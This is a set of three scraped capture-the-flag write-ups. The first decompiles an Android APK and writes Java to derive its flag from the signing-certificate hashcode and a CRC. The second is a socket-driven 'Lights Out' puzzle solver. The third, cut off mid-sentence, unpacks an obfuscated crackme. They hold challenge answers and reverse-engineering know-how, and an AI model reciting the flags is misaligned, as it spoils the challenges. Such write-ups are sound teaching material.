[
  {
    "meta_description": "",
    "meta_keywords": "",
    "meta_og_description": "I haven't ever done a mobile challenge before so I thought I'd give this a try as it was one of the earliest challenges made available on th...",
    "meta_og_title": "0ops CTF Qualifiers 2015 - Vezel - Mobile Challenge",
    "meta_title": "",
    "meta_twitter_description": "",
    "meta_twitter_title": "",
    "score": 104.55892389632137,
    "tag_title": "",
    "tags": "java",
    "text": "capture the swag ctf write-ups corrects ie6 width calculation monday, march 30, 2015 0ops ctf qualifiers 2015 - vezel - mobile challenge i haven't ever done a mobile challenge before so i thought i'd give this a try as it was one of the earliest challenges made available on the 0ctf site when it began. the clue was only this: so firstly we download the file, it's an android apk which is really just a zip file package of all the necessary goodness for a android device to install -rwxrw-rw- 1 root root 907004 mar 30 11:00 vezel.apk    root@mankrik:~/0ctf/vezel# file vezel.apk     vezel.apk: zip archive data, at least v2.0 to extract so let's just unzip it and examine the contents really quick, this challenge is only worth 100 points so maybe it's easy. root@mankrik:~/0ctf/vezel/zip# unzip -qq vezel.apk     root@mankrik:~/0ctf/vezel/zip# ls -la    total 3136    drwxr-xr-x 4 root root  4096 mar 30 11:04 .    drwxr-xr-x 3 root root  4096 mar 30 11:03 ..    -rw-r--r-- 1 root root  1804 mar 27 11:29 androidmanifest.xml    -rw-r--r-- 1 root root 2135512 mar 27 11:29 classes.dex    drwxr-xr-x 2 root root  4096 mar 30 11:04 meta-inf    drwxr-xr-x 24 root root  4096 mar 30 11:04 res    -rw-r--r-- 1 root root 142212 mar 27 11:29 resources.arsc    -rwxr--r-- 1 root root 907004 mar 30 11:03 vezel.apk cool, all the normal android stuff i guess. i don't know much about android files so lets just strings everything and look for a flag! root@mankrik:~/0ctf/vezel/zip# strings `find .` | grep -i 0ctf    0ctf0    0ctf0    0ctf    0ctf{    root@mankrik:~/0ctf/vezel/zip# grep -i 0ctf `find . -type f`    binary file ./meta-inf/cert.rsa matches    binary file ./classes.dex matches ok the rsa cert and the classes.dex file match but not trivially, as in, i don't see a flag just lying about! next step is more research, i found that a classes.dex file is a dalvik executable which contains compiled dalvik bytecode. these can usually be pulled apart by things like dexdump and apktool to get to the dalvik code which, when you look at it looks like someone took all the worst bits of java and jammed it into assembly code, and then turned a blender on. but worse. \u00a0i decompiled that anyway and tried to read the dalvik byte code. using that method i did figure out basically what it was doing but it was a horrible way to go about it so i will save you the time. the proper way to do this is to convert the dalvik executable (classes.dex) into java binaries using a tool called dex2jar (there are others, but i used dex2jar for this). root@mankrik:~/0ctf/vezel/zip# dex2jar classes.dex     this cmd is deprecated, use the d2j-dex2jar if possible    dex2jar version: translator-0.0.9.15    dex2jar classes.dex -> classes_dex2jar.jar    done.     root@mankrik:~/0ctf/vezel/zip# ls -la    total 4292    drwxr-xr-x 4 root root  4096 mar 30 13:46 .    drwxr-xr-x 3 root root  4096 mar 30 11:03 ..    -rw-r--r-- 1 root root  1804 mar 27 11:29 androidmanifest.xml    -rw-r--r-- 1 root root 2135512 mar 27 11:29 classes.dex    -rw-r--r-- 1 root root 1179969 mar 30 13:46 classes_dex2jar.jar    drwxr-xr-x 2 root root  4096 mar 30 11:04 meta-inf    drwxr-xr-x 24 root root  4096 mar 30 11:04 res    -rw-r--r-- 1 root root 142212 mar 27 11:29 resources.arsc    -rwxr--r-- 1 root root 907004 mar 30 11:03 vezel.apk this results in a classes_dex2jar.jar file which, as all .jar files are, is just a .zip file containing the compiled java classes. you can just unzip that file to get at the java binaries: root@mankrik:~/0ctf/vezel/zip# file classes_dex2jar.jar     classes_dex2jar.jar: zip archive data, at least v2.0 to extract    root@mankrik:~/0ctf/vezel/zip# unzip -qq classes_dex2jar.jar     root@mankrik:~/0ctf/vezel/zip# ls -la    total 4300    drwxr-xr-x 6 root root  4096 mar 30 14:29 .    drwxr-xr-x 3 root root  4096 mar 30 11:03 ..    drwxr-xr-x 3 root root  4096 mar 30 13:46 android -rw-r--r-- 1 root root  1804 mar 27 11:29 androidmanifest.xml    -rw-r--r-- 1 root root 2135512 mar 27 11:29 classes.dex    -rw-r--r-- 1 root root 1179969 mar 30 13:46 classes_dex2jar.jar    drwxr-xr-x 3 root root  4096 mar 30 13:46 com    drwxr-xr-x 2 root root  4096 mar 30 11:04 meta-inf    drwxr-xr-x 24 root root  4096 mar 30 11:04 res    -rw-r--r-- 1 root root 142212 mar 27 11:29 resources.arsc    -rwxr--r-- 1 root root 907004 mar 30 11:03 vezel.apk the java binaries for the vezel program live in the com/ctf/vezel/ folder after extraction from the .jar file: root@mankrik:~/0ctf/vezel/zip# cd com/    root@mankrik:~/0ctf/vezel/zip/com# cd ctf    root@mankrik:~/0ctf/vezel/zip/com/ctf# cd vezel/    root@mankrik:~/0ctf/vezel/zip/com/ctf/vezel# ls -la    total 104    drwxr-xr-x 2 root root 4096 mar 30 13:46 .    drwxr-xr-x 3 root root 4096 mar 30 13:46 ..    -rw-r--r-- 1 root root  415 mar 30 13:46 buildconfig.class    -rw-r--r-- 1 root root 2579 mar 30 13:46 mainactivity.class    -rw-r--r-- 1 root root  453 mar 30 13:46 r$anim.class    -rw-r--r-- 1 root root 7191 mar 30 13:46 r$attr.class    -rw-r--r-- 1 root root  582 mar 30 13:46 r$bool.class    -rw-r--r-- 1 root root  765 mar 30 13:46 r.class    -rw-r--r-- 1 root root 3373 mar 30 13:46 r$color.class    -rw-r--r-- 1 root root 2714 mar 30 13:46 r$dimen.class    -rw-r--r-- 1 root root 2976 mar 30 13:46 r$drawable.class    -rw-r--r-- 1 root root 2633 mar 30 13:46 r$id.class    -rw-r--r-- 1 root root  266 mar 30 13:46 r$integer.class    -rw-r--r-- 1 root root 1472 mar 30 13:46 r$layout.class    -rw-r--r-- 1 root root  247 mar 30 13:46 r$menu.class    -rw-r--r-- 1 root root  253 mar 30 13:46 r$mipmap.class    -rw-r--r-- 1 root root 1258 mar 30 13:46 r$string.class    -rw-r--r-- 1 root root 15495 mar 30 13:46 r$styleable.class    -rw-r--r-- 1 root root 14911 mar 30 13:46 r$style.class and these files are listed as java binaries by file: root@mankrik:~/0ctf/vezel/zip/com/ctf/vezel# file mainactivity.class     mainactivity.class: compiled java class data, version 50.0 (java 1.6) ok so i want to check what this program is doing, but i don't want to emulate it and i don't have android sdk. i could get all those things but first there's a simpler way. a java decompiler. i looked around very briefly and found a nice linux supporting one called jd-gui at jd.benow.ca . i grabbed that and installed it quickly. it needs 32bit gtk libraries so i made sure those were installed on my kali vm also... root@mankrik:~/0ctf/vezel/zip/com/ctf/vezel# wget -q http://jd.benow.ca/jd-gui/downloads/jd-gui-0.3.5.linux.i686.tar.gz    root@mankrik:~/0ctf/vezel/zip/com/ctf/vezel# apt-get install ia32-libs-gtk    reading package lists... done    building dependency tree        reading state information... done    ia32-libs-gtk is already the newest version.    0 upgraded, 0 newly installed, 0 to remove and 27 not upgraded.    root@mankrik:~/0ctf/vezel/zip/com/ctf/vezel# tar -zxf jd-gui-0.3.5.linux.i686.tar.gz     root@mankrik:~/0ctf/vezel/zip/com/ctf/vezel# ./jd-gui when it fires up, i opened the mainactivity.class file because it seemed.... pretty ... main .... i guess... the decompiler gui is really nice and easy and fast to move around in. the java code is very easy to read versus the dalvik byte code! the main crux of the program comes once the user clicks \"confirm\" which is a button in the android app. the button fires up this function: public void confirm(view paramview)     {      string str1 = string.valueof(getsig(getpackagename()));      string str2 = getcrc();      if ((\"0ctf{\" + str1 + str2 + \"}\").equals(this.et.gettext().tostring()))      {       toast.maketext(this, \"yes!\", 0).show();       return;      }      toast.maketext(this, \"0ops!\", 0).show();     } which is a hell of a lot like a flag string. so yay, we got a strong lead: the flag consists of the strings \"0ctf{\" str1 - a string made up of the return value of getsig(getpackagename()) str2 - a string made up of the return value of getcrc() ok so we need to find the return values of these functions to build the flag. let's focus on str1 first. this string is returned by this function: private int getsig(string paramstring)     {      packagemanager localpackagemanager = getpackagemanager();      try      {       int i = localpackagemanager.getpackageinfo(paramstring, 64).signatures[0].tocharsstring().hashcode();       return i;      }      catch (exception localexception)      {       localexception.printstacktrace();      }      return 0;     } so it uses the localpackagemanager to getpackageinfo about the hashcode of the signature of the package. brilliant. wtf is that... this needed quite a bit of research but i was able to retrieve the package signature via two methods. installed an apk tool inside an android emulator that had the vezel.apk installed. there are so many apk extractors/tools/etc on the android store but almost all of them are horrible applications. only one of them was able to give me a package signature and i can't remember which of the 10 or so apps it was. suffice to say this option was a bit of a waste of time. derive it from the apk itself. this needs more research. i went with option 1 for a while, got a signature (turned out to be correct but i didnt know at the time) but it wasn't what i used to beat the challenge. i stumbled across this link in my research which turned out to be the right idea. what the function returns is the hashcode() of the getpackageinfo().signatures[0].tocharsstring(). in the java programming language, every class implicitly or explicitly provides a hashcode()  method, which digests the data stored in an instance of the class into a single hash value  (a 32-bit signed integer). great so we combine our knowledge of what a hashcode is and the source code from the link above which parses apk file certificates, specifically to get package signatures to get this part of the challenge done. we use this java code (snippet below) to get the signature hashcode. notice it is the same java code from the link except the hashcode calculation is changed to be the one we need and some of the extraneous output we don't need was removed: if (certs != null && certs.length > 0) {      final int n = certs.length;      for (int i = 0; i < n; i++) {       string charsig = new string(tochars(certs[i].getencoded()));       system.out.println(\"cert#: \" + i + \" type:\" + certs[i].gettype() + \"\\nstr1 is: \" + charsig.hashcode()); }      } else {      system.err.println(\"package has no certificates; ignoring!\");      return;      } when we run it we get this output: root@mankrik:~/0ctf/vezel# javac main.java     root@mankrik:~/0ctf/vezel# java main     usage: java -jar getandroidsig.jar <apk/jar>    root@mankrik:~/0ctf/vezel# java main vezel.apk     vezel.apk    classes.dex 1189242199    cert#: 0 type:x.509 str1 is: -183971537 great so thats the first half of the flag, now let's look at str2. this is returned by the following function: private string getcrc()     {      try      {       string str = string.valueof(new zipfile(getapplicationcontext().getpackagecodepath()).getentry(\"classes.dex\").getcrc());       return str;      }      catch (exception localexception)      {       localexception.printstacktrace();      }      return \"\";     } so this just looks through it's own apk file looking for the file classes.dex and then returns the crc value of that file. too easy. i wanted to do this a few ways but i settled on strictly doing this in java so my results aligned exactly with the vezel program. there are a lot of java tutorials on the net about doing exactly that so all i needed to do was integrate it into my existing java code from before. i did this and my final result was this code: import java.io.ioexception;    import java.io.inputstream;    import java.lang.ref.weakreference;    import java.security.signature;    import java.security.cert.*;    import java.util.enumeration;    import java.util.jar.jarentry;    import java.util.jar.jarfile;    import java.util.logging.level;    import java.util.logging.logger;    import java.util.zip.zipentry;    import java.util.zip.zipfile;    public class main {     private static final object msync = new object();     private static weakreference<byte[]> mreadbuffer;     public static void main(string[] args) {     if (args.length < 1) {      system.out.println(\"usage: java -jar getandroidsig.jar <apk/jar>\");      system.exit(-1);     }     long mycrc = 0;     system.out.println(args[0]);     string marchivesourcepath = args[0];     try {     zipfile zipfile = new zipfile(args[0]);     enumeration o = zipfile.entries();     while(o.hasmoreelements())      {         zipentry entry = (zipentry)o.nextelement();         string entryname = entry.getname();         long crc = entry.getcrc();         if(entryname.startswith(\"classes.dex\")) {              system.out.print(entryname + \" \" + crc + \"\\n\");              mycrc = crc;             }     }     zipfile.close();     }     catch(ioexception ioe)     {         system.out.println(\"error opening zip.\"+ioe);     }     weakreference<byte[]> readbufferref;     byte[] readbuffer = null;     synchronized (msync) {      readbufferref = mreadbuffer;      if (readbufferref != null) {      mreadbuffer = null;      readbuffer = readbufferref.get();      }      if (readbuffer == null) {      readbuffer = new byte[8192];      readbufferref = new weakreference<byte[]>(readbuffer);      }     }     try {      jarfile jarfile = new jarfile(marchivesourcepath);      java.security.cert.certificate[] certs = null;      enumeration entries = jarfile.entries();      while (entries.hasmoreelements()) {      jarentry je = (jarentry) entries.nextelement();      if (je.isdirectory()) {       continue;      }      if (je.getname().startswith(\"meta-inf/\")) {       continue;      }      java.security.cert.certificate[] localcerts = loadcertificates(jarfile, je, readbuffer);      if (false) {       system.out.println(\"file \" + marchivesourcepath + \" entry \" + je.getname()         + \": certs=\" + certs + \" (\"         + (certs != null ? certs.length : 0) + \")\");      }      if (localcerts == null) {       system.err.println(\"package has no certificates at entry \"         + je.getname() + \"; ignoring!\");       jarfile.close();       return;      } else if (certs == null) {       certs = localcerts;      } else {       // ensure all certificates match.       for (int i = 0; i < certs.length; i++) {       boolean found = false;       for (int j = 0; j < localcerts.length; j++) {        if (certs[i] != null          && certs[i].equals(localcerts[j])) {        found = true;        break;        }       }       if (!found || certs.length != localcerts.length) {        system.err.println(\"package has mismatched certificates at entry \"          + je.getname() + \"; ignoring!\");        jarfile.close();        return; // false       }       }      }      }      jarfile.close();      synchronized (msync) {      mreadbuffer = readbufferref;      }      if (certs != null && certs.length > 0) {      final int n = certs.length;      for (int i = 0; i < n; i++) {       string charsig = new string(tochars(certs[i].getencoded()));       system.out.println(\"cert#: \" + i + \" type:\" + certs[i].gettype()       + \"\\nyour flag sir: 0ctf{\" + charsig.hashcode()        + mycrc        + \"}\");      }      } else {      system.err.println(\"package has no certificates; ignoring!\");      return;      }     } catch (certificateencodingexception ex) {      logger.getlogger(main.class.getname()).log(level.severe, null, ex);     } catch (ioexception e) {      system.err.println(\"exception reading \" + marchivesourcepath + \"\\n\" + e);      return;     } catch (runtimeexception e) {      system.err.println(\"exception reading \" + marchivesourcepath + \"\\n\" + e);      return;     }     }     private static char[] tochars(byte[] msignature) {      byte[] sig = msignature;      final int n = sig.length;      final int n2 = n*2;      char[] text = new char[n2];      for (int j=0; j<n; j++) {       byte v = sig[j];       int d = (v>>4)&0xf;       text[j*2] = (char)(d >= 10 ? ('a' + d - 10) : ('0' + d));       d = v&0xf;       text[j*2+1] = (char)(d >= 10 ? ('a' + d - 10) : ('0' + d));      }      return text;      }     private static java.security.cert.certificate[] loadcertificates(jarfile jarfile, jarentry je, byte[] readbuffer) {     try {      // we must read the stream for the jarentry to retrieve      // its certificates.      inputstream is = jarfile.getinputstream(je);      while (is.read(readbuffer, 0, readbuffer.length) != -1) {      // not using      }      is.close();      return (java.security.cert.certificate[]) (je != null ? je.getcertificates() : null);     } catch (ioexception e) {      system.err.println(\"exception reading \" + je.getname() + \" in \"        + jarfile.getname() + \": \" + e);     }     return null;     }    } which i ran and which gave me this output. root@mankrik:~/0ctf/vezel# javac main.java     root@mankrik:~/0ctf/vezel# java main vezel.apk     vezel.apk    classes.dex 1189242199    cert#: 0 type:x.509 your flag sir: 0ctf{-1839715371189242199} i was initially upset that the hashcode was a negative number. the flag looked pretty dumb to me. i would have preferred the hex value of these but oh well. we submitted the flag and it was correct. writeup: dacat posted by capturetheswag 12:08 am email this blogthis! share to twitter share to facebook share to pinterest 3 comments: ledzepvn march 30, 2015 at 12:42 am there's a quicker way to get the crc checksum :) $ python -c \"print __import__('binascii').crc32(__import__('sys').stdin.read())\" < classes.dex reply delete capturetheswag march 30, 2015 at 1:15 am yeah, that is a really good one liner.  you can even just use unzip -vl  | grep classes.dex to get the crc. i wanted to implement it in java so the final code would be one cohesive flag giver. plus i had never written anything in java before so to tinker with it was fun. reply delete fish march 30, 2015 at 11:50 pm http://stackoverflow.com/questions/28447903/how-to-get-signature-hash-code-of-a-phone-app-via-adb-on-pc reply delete add comment load more... newer post older post home subscribe to: post comments (atom) ctfs we entered: 2015 seccon 2015 ekoparty ctf 2015 hack.lu 2015 hitcon 2015 hackover 15 d-ctf 2015 trend micro ctf 2015 quals csaw 2015 quals hust festival defcon ctf quals 2015 asis ctf 2015 volgactf 2015 confidence ds ctf 2015 plaid ctf 2015 nuit du hack ctf quals 2015 links ctf write-ups 2015 @ github ctftime ascii to hex binjitsu / pwntools cuda hashcat blog archive 2015 (30) december october september april march 0ops ctf qualifiers 2015 - vezel - mobile challeng... securinets ctf quals 2015 - aucun_choix reversing ... bctf 2015 - weak_enc crypto challenge vancouver bsides 2015 - sushi pwnable codegate 2015 - system shock pwnable opentoall ctf2015 - gone (forensics) boston key party 2015 - school bus flag #3 columns main outside of the include in order to lock attribution widget awesome inc. theme. theme images by a330pilot . powered by blogger content",
    "title": "vezel",
    "url": "http://capturetheswag.blogspot.com.au/2015/03/0ops-ctf-qualifiers-2015-vezel-mobile.html"
  },
  {
    "meta_description": "",
    "meta_keywords": "",
    "meta_og_description": "Challenge imitating the game of \"Lights out.\"",
    "meta_og_title": "PPC 300 | BaltCTF 2013 | Write-ups | Collegiate Cyber Defense Club @ UCF",
    "meta_title": "",
    "meta_twitter_description": "",
    "meta_twitter_title": "",
    "score": 58.98954640357114,
    "tag_title": "",
    "tags": "",
    "text": "<![endif] media-queries.js (fallback) [if lt ie 9]>\r \t\t\t<script src=\"http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js\"></script>\t\t\t\r \t\t<![endif] html5.js [if lt ie 9]>\r \t\t\t<script src=\"http://html5shim.googlecode.com/svn/trunk/html5.js\"></script>\r \t\t<![endif] wordpress head functions all in one seo pack 2.3.12.4 by michael torbert of semper fi web design[944,951] /all in one seo pack end of wordpress head home about us defensive security offensive security what\u2019s going on calendar competitions meetings workshops press write-ups series hack all the things 2016 mma ctf 2016 csaw quals 2016 tum ctf 2016 hitcon ctf 2016 2015 boston key party ctf 2015 2014 asis 2014 csaw 2014 d-ctf 2014 def con ctf qualifier 2014 hack.lu 2014 ructf quals 2014 2013 csaw 2013 tracer fire 5 2013 2012 29c3ctf 2012 atast 2012 csaw 2012 hack.lu 2012 phdays 2012 polictf 2012 sponsors sponsorship contact end .container end .navbar end header baltctf 2013 :: ppc 300 :: positive posted on may 13, 2013 at 4:16 pm ditmar wendt and filed under baltctf 2013 end article header if you ncat into the server for this challenge, you\u2019re given instructions on how to play a game. this game is a direct copy of lights out , a computer science challenge. you can provide a series of coordinates to toggle, and this will toggle all of the adjacent cells. the goal is to have the entire board on or off. for this, we contacted the ucf programming team , and antony quickly pumped out a java solver. i wrapped this in python and we let it run, after ~100? times it gave us the flag.\r \r our source code is below: crayon syntax highlighter v_2.7.2_beta python import socket\r import re\r import os\r  \r # handle connection\r s = socket.socket(socket.af_inet, socket.sock_stream)\r s.connect((\"194.106.195.60\", 9502))\r  \r # log everything to a file\r def logdat(stuff):\r     tempf = open(\"maplog.txt\" % (mapcount), 'a')\r     tempf.write(stuff)\r  \r # dump the map to a text file and run the compiled java class from earlier\r def gomap(mapstr):\r     f = open('map.txt', 'w')\r     f.write(mapstr)\r     f.close()\r     \r     print \"running generator\"\r     os.system(\"java pluses\")\r  \r     print \"sending shortest path\"\r     shortestpath = open('map.out', 'r').read()\r     print shortestpath + \"n\"\r     s.sendall(shortestpath)    \r  \r  \r # parse/log captcha\r data = s.recv(1024)\r captcha_str = repr(data)\r print 'received:', captcha_str\r \r m_count = 0;\r # if we receive the chunk below, map is done being sent.\r end_regex = re.compile('(?:solved!!! have a fun and finally you will get a flagn)*(.+n.+n.+n.+n.+n.+n.+n.+n.+n.+)n')\r map_data = ''\r  \r while 1:\r     data = s.recv(1024)\r     logdat(data)\r     \r     if not data:\r         break\r     \r     map_data += data\r  \r     # got the last chunk of the map\r     searcher = end_regex.search(map_data)\r     if searcher:\r         m_count+=1\r         gomap(searcher.group(1)) # run the solver\r         map_data = ''\r \r data = s.recv(1024)\r print 'data: ', data, 'n'\r logshit(data)\r  \r print 'connection closed.n'\r s.close() import socket import import # handle connection socket socket socket af_inet socket sock_stream connect \"194.106.195.60\" 9502 # log everything to a file logdat stuff tempf open \"maplog.txt\" mapcount tempf write stuff # dump the map to a text file and run the compiled java class from earlier gomap mapstr open 'map.txt' write mapstr close print \"running generator\" system \"java pluses\" print \"sending shortest path\" shortestpath open 'map.out' read print shortestpath sendall shortestpath # parse/log captcha data recv 1024 captcha_str repr data print 'received:' captcha_str m_count # if we receive the chunk below, map is done being sent. end_regex compile '(?:solved!!! have a fun and finally you will get a flagn)*(.+n.+n.+n.+n.+n.+n.+n.+n.+n.+)n' map_data while data recv 1024 logdat data data break map_data data # got the last chunk of the map searcher end_regex search map_data searcher m_count gomap searcher group # run the solver map_data data recv 1024 print 'data: ' data logshit data print 'connection closed.n' close [format time: 0.0096 seconds] crayon syntax highlighter v_2.7.2_beta java import java.io.file;\r import java.io.filenotfoundexception;\r import java.io.filereader;\r import java.io.filewriter;\r import java.io.ioexception;\r import java.io.printwriter;\r import java.util.scanner;\r \r public class pluses {\r \tpublic static void main(string[] args) throws ioexception {\r \t\t// my own testing code, insert good stuff here\r \t\tstring[] board = {\"++++++++--\",\r \t\t\t\t  \t\t  \"-+-+-----+\",\r \t\t\t\t  \t\t  \"---++----+\",\r \t\t\t\t  \t\t  \"-+++------\",\r \t\t\t\t  \t\t  \"--+--+-++-\",\r \t\t\t\t  \t\t  \"--+-+-+-+-\",\r \t\t\t\t  \t\t  \"--+++----+\",\r \t\t\t\t  \t\t  \"-+-++-+---\",\r \t\t\t\t  \t\t  \"+--++--+--\",\r \t\t\t\t  \t\t  \"++-+--+--+\"};\r \t\t\r \t\tscanner in = new scanner(new filereader(new file(\"map.txt\")));\r \t\tprintwriter out = new printwriter(new filewriter(new file(\"map.out\")));\r \t\t\r \t\tint i=0;\r \t\twhile(in.hasnext()) { board[i] = in.nextline().trim(); i++; }\r \t\t\r //\t\tfor(int i=0;i<10;i++) {\r //\t\tboard[i] = in.nextline().trim();\r //\t\tsystem.out.println(board[i]);\r //\t\t}\r \t\t\r \t\tout.printf(\"%s\", solve(board));\r \t\tout.close();\r \t}\r \t\r \t// solves an instance of the game\r \tstatic int n,m;\r \tstatic int[] dx = {-1,0,1,0,0}, dy = {0,1,0,-1,0};\r \tstatic string solve(string[] board) {\r \t\tn = board.length;\r \t\tm = board[0].length();\r \t\tboolean[][] v = new boolean[n][m];\r \t\tfor(int i=0; i<n; i++)\r \t\t\tfor(int j=0; j<m; j++)\r \t\t\t\tv[i][j] = board[i].charat(j)=='-';\r \t\t// goal is to get v to all false\r \t\t\r \t\tstring best = null;\r \t\t\r \t\t// try all moves in the top row\r \t\tfor(int i=0; i<1<<m; i++) {\r \t\t\tboolean[][] cpy = copy(v);\r \t\t\tstring temp = \"\";\r \t\t\tfor(int j=0; j<m; j++)\r \t\t\t\tif(isset(i,j)) {\r \t\t\t\t\ttemp += 0+\"\"+j;\r \t\t\t\t\tflip(cpy,0,j);\r \t\t\t\t}\r \t\t\tstring rest = finish(cpy);\r \t\t\tif(rest == null) continue;\r \t\t\ttemp += rest;\r \t\t\tif(best == null || best.length() > temp.length())\r \t\t\t\tbest = temp;\r \t\t}\r \t\t\r \t\treturn best;\r \t}\r \t// a partially finished board\r \t// no moves are allowed on the first row, so\r \t// a greedy algo works\r \tstatic string finish(boolean[][] v) {\r \t\tstring temp = \"\";\r \t\tfor(int i=1; i<v.length; i++)\r \t\t\tfor(int j=0; j<v[0].length; j++)\r \t\t\t\tif(v[i-1][j]) {\r \t\t\t\t\tflip(v,i,j);\r \t\t\t\t\ttemp += i+\"\"+j;\r \t\t\t\t}\r \t\t// check if the board was solvable\r \t\tfor(int j=0; j<v[0].length; j++)\r \t\t\tif(v[v.length-1][j])\r \t\t\t\ttemp = null;\r \t\treturn temp;\r \t}\r \tstatic boolean isset(int x, int p) {\r \t\treturn (x&(1<<p)) != 0;\r \t}\r \tstatic void flip(boolean[][] v, int x, int y) {\r \t\tfor(int i=0; i<dx.length; i++) {\r \t\t\tint nx = x+dx[i];\r \t\t\tint ny = y+dy[i];\r \t\t\tif(!ok(nx,ny)) continue;\r \t\t\tv[nx][ny] ^= true;\r \t\t}\r \t}\r \tstatic boolean ok(int x, int y) {\r \t\treturn x>=0 && y>=0 && x<n && y<m;\r \t}\r \tstatic boolean[][] copy(boolean[][] v) {\r \t\tboolean[][] w = new boolean[v.length][v[0].length];\r \t\tfor(int i=0; i<v.length; i++)\r \t\t\tfor(int j=0; j<v[0].length; j++)\r \t\t\t\tw[i][j] = v[i][j];\r \t\treturn w;\r \t}\r } import java file import java filenotfoundexception import java filereader import java filewriter import java ioexception import java printwriter import java util scanner public class pluses public static void main string args throws ioexception // my own testing code, insert good stuff here string board \"++++++++--\" \"-+-+-----+\" \"---++----+\" \"-+++------\" \"--+--+-++-\" \"--+-+-+-+-\" \"--+++----+\" \"-+-++-+---\" \"+--++--+--\" \"++-+--+--+\" scanner scanner filereader file \"map.txt\" printwriter printwriter filewriter file \"map.out\" while hasnext board nextline trim //\t\tfor(int i=0;i<10;i++) { //\t\tboard[i] = in.nextline().trim(); //\t\tsystem.out.println(board[i]); //\t\t} printf \"%s\" solve board close // solves an instance of the game static static static string solve string board board length board length boolean boolean board charat // goal is to get v to all false string best null // try all moves in the top row boolean copy string temp isset temp flip string rest finish rest null continue temp rest best null best length temp length best temp return best // a partially finished board // no moves are allowed on the first row, so // a greedy algo works static string finish boolean string temp length length flip temp // check if the board was solvable length length temp null return temp static boolean isset return static void flip boolean length continue true static boolean return static boolean copy boolean boolean boolean length length length length return [format time: 0.0277 seconds] credits: antony stabile, ditmar wendt end article section tags: baltctf computer science graph theory java lights out python end article footer end article end #main our allies hack evergreen cybersecurity club @ fsu usf's whitehatters uf's kernel sanders cyberpatriot florida cyber alliance (isc)\u00b2 central florida chapter owasp orlando sparsa electronic frontier alliance i want to join the fun hop on irc view the calendar present at a meeting join the mailing list fun zone 2048 snake end #content upcoming rainbow river tubing trip in progress all day on  thursday, may 4 view details modal rainbow river tubing trip this event is in progress. leaving ucf at 8am - check slack for ridesharing tube rentals are $15 per trip but bring enough for 2 trips (~4 hrs). we must arrive earlier as once the lot get full they make cars wait for people to leave. for more information: http://www.rainbowspringspark.com/ begins thursday, may 4 ends thursday, may 4 length 1 day location rainbow springs state park tube rental, 10830 sw 180th avenue rd, dunnellon, fl 34432, usa ( google event view event view calendar close /.modal-content /.modal-dialog /.modal latest additions elections (4/21/2017) csaw quals 2016 :: neo :: crypto 200 anatomy of an attack (4/14/2017) leveraging the cloud (4/7/2017) social engineering (3/31/2017) vector35 talk (3/24/2017) fireeye tech talk (3/10/2017) stay connected you are so important to us that we have provided nine convenient ways for you to stay connected with the collegiate cyber defense club. you can follow us, stay tuned for job and internship opportunities, or even connect to irc to chat-it-up. 320press \u00a9 collegiate cyber defense club @ ucf end #inner-footer end footer end #container [if lt ie 7 ]>   \t\t\t<script src=\"//ajax.googleapis.com/ajax/libs/chrome-frame/1.0.3/cfinstall.min.js\"></script>   \t\t\t<script>window.attachevent('onload',function(){cfinstall.check({mode:'overlay'})})</script> \t\t<![endif]",
    "title": "Positive",
    "url": "http://hackucf.org/blog/baltctf-2013-positive-ppc-300/"
  },
  {
    "meta_description": "",
    "meta_keywords": "",
    "meta_og_description": "",
    "meta_og_title": "",
    "meta_title": "",
    "meta_twitter_description": "",
    "meta_twitter_title": "",
    "score": 50.56246834591812,
    "tag_title": "",
    "tags": "",
    "text": "<![endif] http://t.co/dkp3o1e fonts from google\"s web font directory at http://google.com/webfonts 0ops... new team and new blog. blog archives codegate 2015 reverse 400 dodocrackme2 mar 17 , 2015 from evermars description you are given an apk file looks like some kind of crackme application: solution try to input some characters,it turns out a toast saying \u201cinvalid code\u201d. it seems that we should reverse this apk to find the correct input. open this apk with jeb and we get: obviously the dex code is protected by a packer. by analysing java code we can find the real dex file is hidden in a source file named \u201czlaxyprctgauiqqdecamzbompcphoqmjg.jar\u201d, private static string[] createsubdexlist(context arg3) throws ioexception {     arraylist v1 = new arraylist();     v1.add(\"zlaxyprctgauiqqdecamzbompcphoqmjg.jar\");     string[] v0 = new string[v1.size()];     v1.toarray(((object[])v0));     return v0; } the extract function is implemented in a native lib called \u201clibaurorabridge.so\u201d static {     system.loadlibrary(\"aurorabridge\"); } normally such kind of android packer will release the real dex file into memory or disk after the packer runing. so we should check out the app\u2019s private directory first, you should have a rooted android device to do so. fortunately we find this: i think this is a negligence of the challenge author, most of todays packers i have seen won\u2019t leave the extracted dex file in the filesystem. let\u2019s look into this unpacked dex file, the file header tells us it\u2019s an optimized odex file: so we should recover it into a dex file with smali & baksmli: java -jar baksmali.jar -x xxx.dex -d framework  java -jar smali.jar out now we have a normal dex file, put it into jeb\uff1a we can see the java codes is protected by some kind of obfuscator, most of the class information and all the method information is lost. after this game, the author told me it\u2019s a customized obfuscator developed by himself. by reading these obfuscated codes, we get a approximate understanding of this obfuscate framework \u201caurorabridge\u201d(this name reminds me of the bifr\u00f6st in norse mythology). all the java and android api calls are executed through a proxy native function: public static native object a(aurorabridge this, int arg1, object[] arg2) { } a obfuscated java api call looks like : public static editable a(object arg4) {     try {         return aurorabridge.a(236, new object[]{arg4});     }     catch(exception v0) {         throw aurorabridge.co(v0);     } we guess the first int arg is a serial number represents the java api invoked and the object[] arg is args required by this java api. now it\u2019s time to have a look into libaurorabridge.so. open this lib file with ida: oh no\u2026 it\u2019s a total mess. it seems that all the native code is obfuscated by something looks like llvm control flow flattening and there are mamy function points generated dynamicly. understanding this must be a hardwork. we try to get a copy of this lib from the memory of android device after the initialization of this app through dd, but finding nothing more except lots of encrypted strings\uff1a maybe these are the encrypted java api string, but we don\u2019t know how to decrypt them. after analysising some suspicious method\uff1asub_fe7c, sub_10054, sub102f4, sub105b8(all about the extraction of dex file, nothing todo with our input), we guess the process of input judging is not here, it should be implemented in the java code. so we turn back to analysis the dex file. although most semantic information is gone, we still can try to figure out some useful clues. we locate the onclick() of the button in adb.crackme.b, here\u2019s the code: public void onclick(view arg5) {     string v0 = e.a(o.a(this.a.findviewbyid(2131230783)));     if(v0 != null && f.a(v0) > 0) {         boolean v1 = l.d(this.a.a, v0);         v0 = l.u();         if(v1) {             v0 = l.r();         }          toast v0_1 = g.a(this.a.getapplicationcontext(), v0, 0);         e.a(v0_1, 17, 0, 0);         f.a(v0_1);     } } we can do some basic predicates with the help of some android apps development experience: v0 is our input f.a(string) is string.length() v0_1 is the result string which will be toasted. the value of v0_1 depends on the return value of l.d(class c, string) according to the model of this obfuscation framework, we think our input will be handled and judged by the 3 functions in class 